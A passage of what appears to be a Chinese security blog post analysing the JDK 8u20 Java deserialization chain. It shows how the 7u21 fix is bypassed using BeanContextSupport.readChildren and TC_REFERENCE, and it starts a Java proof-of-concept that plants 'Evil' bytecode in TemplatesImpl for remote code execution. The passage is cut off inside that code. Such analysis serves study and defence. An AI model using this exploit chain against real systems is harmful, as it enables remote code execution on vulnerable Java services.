+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashSet</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>HashSet</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>309</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke0</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>NativeMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>57</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>DelegatingMethodAccessorImpl</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>43</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>Method</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>601</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectStreamClass</span><span class=p>.</span><span class=na>invokeReadObject</span><span class=p>(</span><span class=n>ObjectStreamClass</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1004</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readSerialData</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1891</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readOrdinaryObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1796</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readObject0</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>1348</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>370</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>Base</span><span class=p>.</span><span class=na>Unserialize</span><span class=p>.</span><span class=na>Jdk</span><span class=p>.</span><span class=na>jdk7u21Unserialize</span><span class=p>.</span><span class=na>unserialize</span><span class=p>(</span><span class=n>jdk7u21Unserialize</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>68</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>Base</span><span class=p>.</span><span class=na>Unserialize</span><span class=p>.</span><span class=na>Jdk</span><span class=p>.</span><span class=na>jdk7u21Unserialize</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>jdk7u21Unserialize</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>49</span><span class=p>)</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>修复方式是，在<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>里面，之前捕获异常但是直接返回了，不影响反序列化，现在是直接抛出异常，就阻碍反序列化了。</p><p><img src=/p/jdk8u20-deserialization/1.png width=2052 height=1506 loading=lazy alt=img></p><p>但是我们观察到<code>AnnotationInvocationHandler</code> 的 <code>readObject()</code> 当中，除了第一行调用了 <code>ObjectInputStream</code> 的 <code>defaultReadObject()</code> 外，其他位置都没有再从 stream 中读内容，也就是说，在 throw Exception 之前，一个 <code>AnnotationInvocationHandler</code> 对象已经被完整构造好了。来看一个有趣的逻辑问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>Base.Unserialize.Jdk</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>test</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>1</span><span class=o>/</span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>){</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Exception</span><span class=p>(</span><span class=s>&#34;bitch&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>){</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;good&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>最终回显为good，典型的双重否定变肯定！那现在需要找到一个合适的 readObject，前面的反序列化入口是<code>Hashset#readObject</code>，并且其中还会触发<code>s.readObject()</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=o>=</span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>&lt;</span><span class=n>size</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>E</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=p>)</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>e</span><span class=p>,</span><span class=w> </span><span class=n>PRESENT</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>这个 for 循环学习CC链的时候经常见，有两次，第一次是通过 <code>readObject()</code> 构造一个 <code>TemplatesImpl</code> ，第二次是通过 <code>readObject()</code> 构造一个 proxy ，然后 put 这个 proxy ，而也就是这第二次的 put 触发了RCE。而 Proxy 对象只有一个属性 InvocationHandler 那必然是复用这个地方</p><p><img src=/p/jdk8u20-deserialization/2.png width=1458 height=766 loading=lazy alt=img></p><p>Java序列化协议允许通过<code>TC_REFERENCE</code>(0x71)引用已反序列化的对象。这种设计原本是为了优化重复对象的存储，但是现在，hiahia，所以现在再找一个和jdk7u21时的<code>AnnotationInvocationHandler</code>一样的类就行了，找到<code>java.beans.beancontext.BeanContextSupport</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span><span class=w> </span><span class=kd>synchronized</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>synchronized</span><span class=p>(</span><span class=n>BeanContext</span><span class=p>.</span><span class=na>globalHierarchyLock</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ois</span><span class=p>.</span><span class=na>defaultReadObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>initialize</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>bcsPreDeserializationHook</span><span class=p>(</span><span class=n>ois</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>serializable</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>getBeanContextPeer</span><span class=p>()))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>readChildren</span><span class=p>(</span><span class=n>ois</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>deserialize</span><span class=p>(</span><span class=n>ois</span><span class=p>,</span><span class=w> </span><span class=n>bcmListeners</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=p>(</span><span class=n>1</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>跟进到 readChildren</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readChildren</span><span class=p>(</span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>count</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>serializable</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>count</span><span class=o>--</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w>                      </span><span class=n>child</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>BeanContextSupport</span><span class=p>.</span><span class=na>BCSChild</span><span class=w> </span><span class=n>bscc</span><span class=w>  </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>child</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>bscc</span><span class=w>  </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>BeanContextSupport</span><span class=p>.</span><span class=na>BCSChild</span><span class=p>)</span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>ioe</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>continue</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=n>cnfe</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>continue</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>synchronized</span><span class=p>(</span><span class=n>child</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>BeanContextChild</span><span class=w> </span><span class=n>bcc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>bcc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>BeanContextChild</span><span class=p>)</span><span class=n>child</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>ClassCastException</span><span class=w> </span><span class=n>cce</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=c1>// do nothing;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>bcc</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>bcc</span><span class=p>.</span><span class=na>setBeanContext</span><span class=p>(</span><span class=n>getBeanContextPeer</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                       </span><span class=n>bcc</span><span class=p>.</span><span class=na>addPropertyChangeListener</span><span class=p>(</span><span class=s>&#34;beanContext&#34;</span><span class=p>,</span><span class=w> </span><span class=n>childPCL</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                       </span><span class=n>bcc</span><span class=p>.</span><span class=na>addVetoableChangeListener</span><span class=p>(</span><span class=s>&#34;beanContext&#34;</span><span class=p>,</span><span class=w> </span><span class=n>childVCL</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>PropertyVetoException</span><span class=w> </span><span class=n>pve</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>continue</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>childDeserializedHook</span><span class=p>(</span><span class=n>child</span><span class=p>,</span><span class=w> </span><span class=n>bscc</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>可以看到 readChildren 方法里面的catch模块全是 continue，并且也进行了<code>ois.readObject()</code>来反序列化，结合序列化中 Reference 的特性，只要让上面的 for 循环运行3次（也就是 s.readObject() 运行三次），第一次构建<code>AnnotationInvocationHandler</code>，第二次和原来一样，构造一个 TemplatesImpl ， 第三次用 TC_REFERENCE 让 proxy 的 h 指向第一次构建的<code>AnnotationInvocationHandler</code>，而为了这样精准的控制，我们需要使用 LinkedHashSet 而不是 Hashset，<code>LinkedHashSet</code> 的序列化/反序列化行为会严格保持插入顺序，而 <code>HashSet</code> 的顺序是不确定的。</p><h2 id=poc>Poc</h2><h3 id=poc1-报错>poc1 报错</h3><p>首先设置 serializable 为1触发 readChildren，然后引用 handler，在 children 字段注入 Hashmap，LinkedHashSet 不要把顺序弄错了，最后注入 memberValues形成比较触发RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>Base.Unserialize.Jdk</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.xml.transform.Templates</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.beans.beancontext.BeanContextSupport</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>jdk8u20Poc1</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Pwnr&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_tfactory&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerFactoryImpl</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>().</span><span class=na>get</span><span class=p>(</span><span class=n>Base</span><span class=p>.</span><span class=na>Unserialize</span><span class=p>.</span><span class=na>Base</span><span class=p>.</span><span class=na>Evil</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>()).</span><span class=na>toBytecode</span><span class=p>()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BeanContextSupport</span><span class=w> </span><span class=n>bcs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BeanContextSupport</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>bcs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;serializable&#34;</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class=p>);</span><span class=w>
